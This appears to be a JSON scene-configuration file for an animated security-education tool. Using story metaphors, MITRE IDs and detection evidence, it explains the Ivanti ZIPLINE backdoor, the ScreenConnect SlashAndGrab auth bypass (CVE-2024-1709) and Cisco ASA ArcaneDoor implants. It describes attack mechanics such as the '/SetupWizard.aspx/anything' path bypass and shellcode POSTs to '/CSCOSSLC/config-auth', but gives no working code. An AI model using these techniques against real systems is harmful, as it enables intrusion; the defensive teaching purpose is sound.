      "title": "Ivanti Connect Secure (UNC5221): Auth Bypass, RCE & ZIPLINE Backdoor — Process Memory & Artifacts X-Ray",
      "storyCue": "Place the untouched factory blueprint of tunnel gate beside a live X-ray of the running workspace. While the outer cover looks identical to every routine security check, the sweeping golden X-ray beam exposes the tampered interior section planted during the intrusion.",
      "technicalCue": "Memory X-Ray: /home/bin/web (ZIPLINE Hook) (/home/lib/libdsupgrade.so (ZIPLINE) [R-X])",
      "storyMappings": [
        {
          "storyTerm": "Untouched Factory Blueprint (Left)",
          "technicalTerm": "Expected Clean On-Disk Image & Normal Pages of /home/bin/web (ZIPLINE Hook)",
          "tone": "sky"
        },
        {
          "storyTerm": "Tampered Live Interior Section (Right)",
          "technicalTerm": "0x00007F8C20100000 (R-X, 72 KB) · /home/lib/libdsupgrade.so (ZIPLINE)",
          "tone": "rose"
        },
        {
          "storyTerm": "Sweeping Golden X-Ray Scanner",
          "technicalTerm": "Live RAM Triage Comparing Clean Baseline Against /home/bin/web (ZIPLINE Hook) (PID 2048)",
          "tone": "amber"
        },
        {
          "storyTerm": "Exposed Hidden Modification Proof",
          "technicalTerm": "Trojanized libdsupgrade.so loaded into /home/bin/web inspecting incoming SSL-VPN connections for magic string I5033248.",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-ivanti-cs-memory-xray-left",
          "tag": "CLEAN BASELINE · EXPECTED",
          "title": "Untouched Factory Blueprint (Left)",
          "subtitle": "Expected Clean On-Disk Image & Normal Pages of /home/bin/web…",
          "tone": "sky"
        },
        {
          "id": "net-ivanti-cs-memory-xray-right",
          "tag": "LIVE MEMORY · R-X",
          "title": "Tampered Live Interior Section (Right)",
          "subtitle": "0x00007F8C20100000 (R-X, 72 KB) · /home/lib/libdsupgrade.so…",
          "tone": "rose"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Clean Baseline",
          "stageTag": "MEMORY 01 · BASELINE",
          "title": "Inspect Expected Clean Blueprint",
          "storyExcerpt": "On the left rests the official untouched blueprint showing every compartment sealed in its normal factory order.",
          "technicalParallel": "Baseline /home/bin/web (ZIPLINE Hook) loads standard signed read-only and read-execute sections with zero injected artifacts.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tampered Pages",
          "stageTag": "MEMORY 02 · TAMPERING",
          "title": "Golden Scanner Sweeps Both Chambers Side by Side",
          "storyExcerpt": "The overhead golden scanner glides across both chambers, illuminating a glowing crimson block hidden inside the live compartment.",
          "technicalParallel": "Memory inspection flags 0x00007F8C20100000 (R-X, 72 KB) containing /home/lib/libdsupgrade.so (ZIPLINE).",
          "accentHex": "#FACC15",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. X-Ray Diff",
          "stageTag": "MEMORY 03 · DIFF",
          "title": "Side-by-Side Comparison Proves Runtime Tampering",
          "storyExcerpt": "Even though the outer cover never raised a surface alarm, comparing both chambers side by side proves the interior was altered in motion.",
          "technicalParallel": "Forensic triage of PID 2048 confirms injected region: Trojanized libdsupgrade.so loaded into /home/bin/web inspecting incoming SSL-VPN connections for magic string I5033248.",
          "accentHex": "#F43F5E",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.1,
            5.9,
            16
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Clean Baseline",
          "position": [
            -6.4,
            4,
            8.6
          ],
          "target": [
            -4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Live Memory",
          "position": [
            6.4,
            4,
            8.6
          ],
          "target": [
            4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "X-Ray Gantry",
          "position": [
            0,
            8.2,
            8.2
          ],
          "target": [
            0,
            2.1,
            -0.2
          ]
        }
      ]
    }
  },
  "splunk-screenconnect-slashandgrab": {
    "briefing": {
      "scenarioId": "splunk-screenconnect-slashandgrab",
      "sectionKey": "briefing",
      "sceneKind": "net-screenconnect-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "ConnectWise ScreenConnect \"SlashAndGrab\" Auth Bypass & RMM RCE — Story-to-Technical Overview",
      "storyCue": "A remote help-desk dispatch center locks away its opening-day setup desk after launch, yet adding one extra slash to the hallway sign reopens the empty setup form. An outsider walks in, overwrites the master dispatcher roster with their own name, and uses the built-in dispatch radio to push instant orders to every managed workstation.",
      "technicalCue": "INITIAL ACCESS: SETUPWIZARD.ASPX/ TRAVERSAL & USER.XML OVERWRITE (CVE-2024-1709) -> PERSISTENCE: MALICIOUS .ASHX EXTENSION UPLOAD & SYSTEM RCE -> LATERAL & C2: DOWNSTREAM FLEET COMMAND PUSH OVER TCP 8041",
      "storyMappings": [
        {
          "storyTerm": "Remote dispatch center",
          "technicalTerm": "ConnectWise ScreenConnect RMM server",
          "tone": "amber"
        },
        {
          "storyTerm": "Extra slash hallway sign",
          "technicalTerm": "Path-traversal bypass on /SetupWizard.aspx/ (CVE-2024-1709)",
          "tone": "sky"
        },
        {
          "storyTerm": "Master dispatcher roster",
          "technicalTerm": "App_Data\\User.xml administrator credential file",
          "tone": "rose"
        },
        {
          "storyTerm": "Built-in dispatch radio",
          "technicalTerm": "Backstage administrative command runner",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-screenconnect-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Remote dispatch center",
          "subtitle": "ConnectWise ScreenConnect RMM server",
          "tone": "amber"
        },
        {
          "id": "net-screenconnect-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Extra slash hallway sign",
          "subtitle": "Path-traversal bypass on /SetupWizard.aspx/ (CVE-2024-1709)",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Word Lock",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "SETUPWIZARD.ASPX/ TRAVERSAL & USER.XML OVERWRITE (CVE-2024-1709)",
          "storyExcerpt": "An outsider appends a trailing slash and random word to the closed setup-room doorway. The hallway lock checks only for an exact room name, so the setup desk swings wide open on a fully operating…",
          "technicalParallel": "In ASP.NET, a URL like /Page.aspx/extra is routed to the handler for /Page.aspx with Request.PathInfo set to \"/extra\".",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Form",
          "stageTag": "STAGE 02 · PERSISTENCE",
          "title": "MALICIOUS .ASHX EXTENSION UPLOAD & SYSTEM RCE",
          "storyExcerpt": "Sitting at the reopened setup desk, the outsider fills in a fresh owner name and password. The dispatch system dutifully wipes the old supervisor roster book, saves the newcomer as sole owner, and hands…",
          "technicalParallel": "Because the Setup Wizard was designed for a fresh installation, completing the wizard resets App_Data\\User.xml from scratch (overwriting existing administrator hashes with attacker-chosen credentials)…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Hand Does",
          "stageTag": "STAGE 03 · LATERAL & C2",
          "title": "DOWNSTREAM FLEET COMMAND PUSH OVER TCP 8041",
          "storyExcerpt": "With the master badge in hand, the outsider does not need to pick a single lock on employee desks. They simply press the legitimate dispatch intercom to broadcast silent maintenance orders to hundreds of…",
          "technicalParallel": "Without needing a single exploit on the client workstations, the operator uses the built-in Backstage command runner (a legitimate remote-management console hidden from the logged-in desktop user) to…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Setup Door",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Dispatch Mast",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Admin Key",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "splunk-screenconnect-slashandgrab",
      "sectionKey": "step-1",
      "sceneKind": "net-screenconnect-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Accessing \"/SetupWizard.aspx/anything\" to Reopen the Initial Installation Wizard (CVE-2024-1709)",
      "storyCue": "An outsider appends a trailing slash and random word to the closed setup-room doorway. The hallway lock checks only for an exact room name, so the setup desk swings wide open on a fully operating dispatch center.",
      "technicalCue": "T1190 · INITIAL ACCESS — As reverse-engineered by Huntress, to block access to the initial setup page after Day 1, ScreenConnect’s authentication filter checked whether the requested URL ended with the exact string…",
      "storyMappings": [
        {
          "storyTerm": "Closed setup-room doorway",
          "technicalTerm": "Initial installation /SetupWizard.aspx page",
          "tone": "amber"
        },
        {
          "storyTerm": "Trailing slash and random word",
          "technicalTerm": "Path suffix bypass (/SetupWizard.aspx/anything)",
          "tone": "sky"
        },
        {
          "storyTerm": "Exact-name hallway lock",
          "technicalTerm": "Flawed URL path check (CVE-2024-1709)",
          "tone": "rose"
        },
        {
          "storyTerm": "Open setup desk",
          "technicalTerm": "HTTP 200 access to setup wizard on a live server",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-screenconnect-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Closed setup-room doorway",
          "subtitle": "Initial installation /SetupWizard.aspx page",
          "tone": "amber"
        },
        {
          "id": "net-screenconnect-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Trailing slash and random word",
          "subtitle": "Path suffix bypass (/SetupWizard.aspx/anything)",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Word",
          "stageTag": "STEP 01 · SETUP",
          "title": "Closed setup-room doorway",
          "storyExcerpt": "An outsider appends a trailing slash and random word to the closed setup-room doorway.",
          "technicalParallel": "In ASP.NET, a URL like /Page.aspx/extra is routed to the handler for /Page.aspx with Request.PathInfo set to \"/extra\".",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Word",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Trailing slash and random word",
          "storyExcerpt": "The hallway lock checks only for an exact room name, so the setup desk swings wide open on a fully operating dispatch center.",
          "technicalParallel": "As reverse-engineered by Huntress, to block access to the initial setup page after Day 1, ScreenConnect’s authentication filter checked whether the requested URL ended with the exact string…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Lock",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Forensic Detection",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across open setup desk while locking down exact-name hallway lock.",
          "technicalParallel": "Documented by Splunk SURGe and Huntress (web access log detections for SlashAndGrab): HTTP GET/POST requests matching /SetupWizard.aspx/* returning status 200 on an already provisioned server (proving an…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Setup Door",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Dispatch Mast",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Admin Key",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "splunk-screenconnect-slashandgrab",
      "sectionKey": "step-2",
      "sceneKind": "net-screenconnect-step-2",
      "stageBadge": "STEP #2 · PERSISTENCE",
      "title": "Submitting the Setup Form to Overwrite the Server’s \"User.xml\" Administrator Database",
      "storyCue": "Sitting at the reopened setup desk, the outsider fills in a fresh owner name and password. The dispatch system dutifully wipes the old supervisor roster book, saves the newcomer as sole owner, and hands over a valid master badge.",
      "technicalCue": "T1505.003 · PERSISTENCE — With the first-time setup wizard open in their browser, the attacker submits a new administrator username and password.",
      "storyMappings": [
        {
          "storyTerm": "Fresh owner registration form",
          "technicalTerm": "Submitted SetupWizard administrator creation POST",
          "tone": "amber"
        },
        {
          "storyTerm": "Supervisor roster book",
          "technicalTerm": "App_Data\\User.xml credential database",
          "tone": "sky"
        },
        {
          "storyTerm": "Valid master badge",
          "technicalTerm": "Authenticated administrator session cookie",
          "tone": "rose"
        },
        {
          "storyTerm": "Custom desk add-on",
          "technicalTerm": "Malicious extension file placed in App_Extensions",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-screenconnect-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Fresh owner registration form",
          "subtitle": "Submitted SetupWizard administrator creation POST",
          "tone": "amber"
        },
        {
          "id": "net-screenconnect-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Supervisor roster book",
          "subtitle": "App_Data\\User.xml credential database",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Form",
          "stageTag": "STEP 02 · SETUP",
          "title": "Fresh owner registration form",
          "storyExcerpt": "Sitting at the reopened setup desk, the outsider fills in a fresh owner name and password.",
          "technicalParallel": "Because the Setup Wizard was designed for a fresh installation, completing the wizard resets App_Data\\User.xml from scratch (overwriting existing administrator hashes with attacker-chosen credentials)…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Book",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Supervisor roster book",
          "storyExcerpt": "The dispatch system dutifully wipes the old supervisor roster book, saves the newcomer as sole owner, and hands over a valid master badge.",
          "technicalParallel": "With the first-time setup wizard open in their browser, the attacker submits a new administrator username and password.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Desk",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Custom desk add-on",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across custom desk add-on while locking down valid master badge.",
          "technicalParallel": "Documented in Sysmon EventID 11 (file creation and overwrite telemetry) and ScreenConnect Audit Logs: Modification of C:\\Program Files (x86)\\ScreenConnect\\App_Data\\User.xml and App_Extensions\\*.ashx by…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Setup Door",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Dispatch Mast",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Admin Key",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1505.003"
    },
    "step-3": {
      "scenarioId": "splunk-screenconnect-slashandgrab",
      "sectionKey": "step-3",
      "sceneKind": "net-screenconnect-step-3",
      "stageBadge": "STEP #3 · LATERAL & C2",
      "title": "Abusing the RMM Console to Push SYSTEM Commands to Connected Client Machines",
      "storyCue": "With the master badge in hand, the outsider does not need to pick a single lock on employee desks. They simply press the legitimate dispatch intercom to broadcast silent maintenance orders to hundreds of connected offices at once.",
      "technicalCue": "T1219 · LATERAL & C2 — Why is compromising an RMM server so catastrophic? Because every laptop and server managed by the IT team has the ScreenConnect client agent (ScreenConnect.ClientService.exe, a trusted…",
      "storyMappings": [
        {
          "storyTerm": "Legitimate dispatch intercom",
          "technicalTerm": "ScreenConnect Backstage non-interactive shell",
          "tone": "amber"
        },
        {
          "storyTerm": "Connected branch offices",
          "technicalTerm": "Managed client endpoints running ClientService",
          "tone": "sky"
        },
        {
          "storyTerm": "Master building clearance",
          "technicalTerm": "NT AUTHORITY\\SYSTEM execution privilege",
          "tone": "rose"
        },
        {
          "storyTerm": "Broadcast maintenance order",
          "technicalTerm": "Temporary batch scripts invoking cmd.exe or powershell.exe",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-screenconnect-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Legitimate dispatch intercom",
          "subtitle": "ScreenConnect Backstage non-interactive shell",
          "tone": "amber"
        },
        {
          "id": "net-screenconnect-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Connected branch offices",
          "subtitle": "Managed client endpoints running ClientService",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Hand Does",
          "stageTag": "STEP 03 · SETUP",
          "title": "Legitimate dispatch intercom",
          "storyExcerpt": "With the master badge in hand, the outsider does not need to pick a single lock on employee desks.",
          "technicalParallel": "Without needing a single exploit on the client workstations, the operator uses the built-in Backstage command runner (a legitimate remote-management console hidden from the logged-in desktop user) to…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. They",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Connected branch offices",
          "storyExcerpt": "They simply press the legitimate dispatch intercom to broadcast silent maintenance orders to hundreds of connected offices at once.",
          "technicalParallel": "Why is compromising an RMM server so catastrophic? Because every laptop and server managed by the IT team has the ScreenConnect client agent (ScreenConnect.ClientService.exe, a trusted background service…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Down",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Broadcast maintenance order",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across broadcast maintenance order while locking down master building clearance.",
          "technicalParallel": "Documented by Huntress and Splunk SURGe (endpoint process creation indicators for abused RMM sessions): ScreenConnect.ClientService.exe spawning cmd.exe / powershell.exe from…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Setup Door",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Dispatch Mast",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Admin Key",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1219"
    }
  },
  "talos-arcanedoor-asa": {
    "briefing": {
      "scenarioId": "talos-arcanedoor-asa",
      "sectionKey": "briefing",
      "sceneKind": "net-arcanedoor-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1542",
      "title": "ArcaneDoor (UAT4356): Cisco ASA Zero-Days, Line Dancer & Line Runner — Story-to-Technical Overview",
      "storyCue": "A fortress gatekeeper checks visitor clearance cards using an internal handbook kept on a live workbench. An outsider slips a coded message into the clearance envelope that rewrites pages on the live workbench, turns off the watchtower alarm bell, and plants a hidden archive package in the basement vault so the backdoor returns after every seasonal rebuild.",
      "technicalCue": "PERSISTENCE: ASA ZERO-DAY EXPLOIT & LINE RUNNER FLASH PERSISTENCE -> EXECUTION: LINE DANCER IN-MEMORY SHELLCODE INTERPRETER -> DEFENSE EVASION: SYSLOG SUPPRESSION, PCAP CAPTURE & CONFIG EXFIL",
      "storyMappings": [
        {
          "storyTerm": "Fortress gatekeeper",
          "technicalTerm": "Perimeter network security firewall appliance",
          "tone": "amber"
        },
        {
          "storyTerm": "Clearance envelope message",
          "technicalTerm": "Oversized encoded authentication POST payload",
          "tone": "sky"
        },
        {
          "storyTerm": "Live workbench rewrite",
          "technicalTerm": "Line Dancer in-memory resident implant",
          "tone": "rose"
        },
        {
          "storyTerm": "Basement vault archive",
          "technicalTerm": "Line Runner persistent web package across reboots",
          "tone": "emerald"
        }
      ],
      "accentHex": "#A855F7",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-arcanedoor-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Fortress gatekeeper",
          "subtitle": "Perimeter network security firewall appliance",
          "tone": "amber"
        },
        {
          "id": "net-arcanedoor-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Clearance envelope message",
          "subtitle": "Oversized encoded authentication POST payload",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Side",
          "stageTag": "STAGE 01 · PERSISTENCE",
          "title": "ASA ZERO-DAY EXPLOIT & LINE RUNNER FLASH PERSISTENCE",
          "storyExcerpt": "An uninvited courier mails an oversized clearance envelope to the fortress side window. Inside the reply form, folded rows of coded symbols slip past the gatekeeper check and place raw instructions onto…",
          "technicalParallel": "Normally, the ASA’s XML parser processes <host-scan-reply> during AnyConnect posture checks.",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. In-memory Bell",
          "stageTag": "STAGE 02 · EXECUTION",
          "title": "LINE DANCER IN-MEMORY SHELLCODE INTERPRETER",
          "storyExcerpt": "Once active on the workbench, a silent in-memory agent mutes the watchtower logbook bell and redirects incoming check-in packets so the outsider can inspect traffic and run custom gate commands without…",
          "technicalParallel": "Because perimeter network appliances cannot run standard Windows/Linux EDR agents, modifying the running lina process in volatile RAM hides the implant from normal CLI checks, and can only be caught…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Live",
          "stageTag": "STAGE 03 · DEFENSE EVASION",
          "title": "SYSLOG SUPPRESSION, PCAP CAPTURE & CONFIG EXFIL",
          "storyExcerpt": "To survive a full guard shift change and fortress restart, the outsider places a concealed spare bundle inside the basement storage cabinet that automatically unpacks a hidden side-door script every time…",
          "technicalParallel": "Combining Line Runner (disk0: boot persistence via CVE-2024-20359) with Line Dancer (volatile RAM command execution inside lina) gives the attacker both reboot survival and zero-footprint daily operation.",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Fortress Arch",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Core Memory",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Silent Trigger",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "talos-arcanedoor-asa",
      "sectionKey": "step-1",
      "sceneKind": "net-arcanedoor-step-1",
      "stageBadge": "STEP #1 · PERSISTENCE",
      "title": "Delivering Base64-Encoded Shellcode Payloads Inside AnyConnect /CSCOSSLC/config-auth Requests",
      "storyCue": "An uninvited courier mails an oversized clearance envelope to the fortress side window. Inside the reply form, folded rows of coded symbols slip past the gatekeeper check and place raw instructions onto the active guard workbench.",
      "technicalCue": "T1542 · PERSISTENCE — To control the compromised Cisco ASA firewall without opening any suspicious new network port, the attacker sends standard HTTPS POST requests on port 443 to /CSCOSSLC/config-auth (the exact…",
      "storyMappings": [
        {
          "storyTerm": "Fortress side window",
          "technicalTerm": "SSL remote-access authentication endpoint",
          "tone": "amber"
        },
        {
          "storyTerm": "Oversized clearance envelope",
          "technicalTerm": "Crafted host-scan-reply POST body",
          "tone": "sky"
        },
        {
          "storyTerm": "Folded coded symbols",
          "technicalTerm": "Base64-encoded binary instruction payload",
          "tone": "rose"
        },
        {
          "storyTerm": "Active guard workbench",
          "technicalTerm": "Running appliance process memory",
          "tone": "emerald"
        }
      ],
      "accentHex": "#A855F7",
      "secondaryHex": "#A855F7",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-arcanedoor-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Fortress side window",
          "subtitle": "SSL remote-access authentication endpoint",
          "tone": "amber"
        },
        {
          "id": "net-arcanedoor-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Oversized clearance envelope",
          "subtitle": "Crafted host-scan-reply POST body",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Side",
          "stageTag": "STEP 01 · SETUP",
          "title": "Fortress side window",
          "storyExcerpt": "An uninvited courier mails an oversized clearance envelope to the fortress side window.",
          "technicalParallel": "Normally, the ASA’s XML parser processes <host-scan-reply> during AnyConnect posture checks.",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Form Rows",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Oversized clearance envelope",
          "storyExcerpt": "Inside the reply form, folded rows of coded symbols slip past the gatekeeper check and place raw instructions onto the active guard workbench.",
          "technicalParallel": "To control the compromised Cisco ASA firewall without opening any suspicious new network port, the attacker sends standard HTTPS POST requests on port 443 to /CSCOSSLC/config-auth (the exact URL that…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Down",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Active guard workbench",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across active guard workbench while locking down folded coded symbols.",
          "technicalParallel": "Documented by Cisco Talos (CVE-2024-20353 advisory covering perimeter firewall exploitation): anomalous POST requests to /CSCOSSLC/config-auth with oversized <host-scan-reply> payloads from non-VPN…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Fortress Arch",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Core Memory",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Silent Trigger",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1542"
    },
    "step-2": {
      "scenarioId": "talos-arcanedoor-asa",
      "sectionKey": "step-2",
      "sceneKind": "net-arcanedoor-step-2",
      "stageBadge": "STEP #2 · EXECUTION",
      "title": "\"Line Dancer\" In-Memory Implant Disables Syslog & Executes Arbitrary CLI Commands",
      "storyCue": "Once active on the workbench, a silent in-memory agent mutes the watchtower logbook bell and redirects incoming check-in packets so the outsider can inspect traffic and run custom gate commands without leaving paper records.",
      "technicalCue": "T1059 · EXECUTION — Inside the ASA’s main lina executable (the monolithic process that handles all firewalling, routing, and VPN sessions on a Cisco ASA), the Line Dancer memory-only implant decodes the incoming…",
      "storyMappings": [
        {
          "storyTerm": "Silent workbench agent",
          "technicalTerm": "Line Dancer memory-only implant",
          "tone": "amber"
        },
        {
          "storyTerm": "Muting the logbook bell",
          "technicalTerm": "Suppression of outbound syslog audit alerts",
          "tone": "sky"
        },
        {
          "storyTerm": "Guard handbook text",
          "technicalTerm": "Running appliance executable code segment",
          "tone": "rose"
        },
        {
          "storyTerm": "Custom gate commands",
          "technicalTerm": "Arbitrary memory-dispatched appliance actions",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#A855F7",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-arcanedoor-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Silent workbench agent",
          "subtitle": "Line Dancer memory-only implant",
          "tone": "amber"
        },
        {
          "id": "net-arcanedoor-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Muting the logbook bell",
          "subtitle": "Suppression of outbound syslog audit alerts",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. In-memory Bell",
          "stageTag": "STEP 02 · SETUP",
          "title": "Silent workbench agent",
